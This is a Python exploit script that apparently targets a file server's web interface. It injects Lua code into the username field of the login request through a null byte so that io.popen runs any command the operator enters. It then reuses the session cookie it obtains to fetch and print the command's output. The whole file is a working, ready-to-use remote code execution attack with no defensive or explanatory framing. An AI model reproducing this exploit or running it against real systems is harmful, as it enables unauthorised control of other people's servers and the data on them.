import requests
import re
from urllib.parse import quote

# input target &&  command 
target = input("Enter target URL (e.g. http://192.168.1.10:5466): ").strip()
command = input("Enter command to run (e.g. whoami): ").strip()
# put any username and encode it!!!
username = "anonymous"
encoded = quote(username)
# payload 
payload = (
    f"username={encoded}%00]]%0d"
    f"local+h+%3d+io.popen(\"{command}\")%0d"
    f"local+r+%3d+h%3aread(\"*a\")%0d"
    f"h%3aclose()%0d"
    f"print(r)%0d--"
    f"&password="
)
# sending a  post request to grab UID ...
print(f"\n[*] Sending payload to {target}/loginok.html ...")

session = requests.Session()
response = session.post(
    url=f"{target}/loginok.html",
    data=payload,
    headers={
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0"
    }
)
# grab cookies from intital request
cookie_header = response.headers.get("Set-Cookie", "")
match = re.search(r"UID=([a-f0-9]+)", cookie_header)
if match:
    uid = match.group(1)
    print(f"[+] Got UID: {uid}")
else:
    print("[-] No UID found. Target may not be vulnerable.")
    exit()

print("[*] Output...")

result = session.post(
    url=f"{target}/dir.html",
    data=b"1",
    headers={
        "Cookie": f"UID={uid}",
        "User-Agent": "Mozilla/5.0"
    }
)

raw = result.text

# split on the XML declaration â€” take only the left part [0]
clean_output = raw.split("<?xml")[0].strip()

print("[+] Running Command Output:")
print("=" * 80)
print(clean_output)
print("=" * 80)
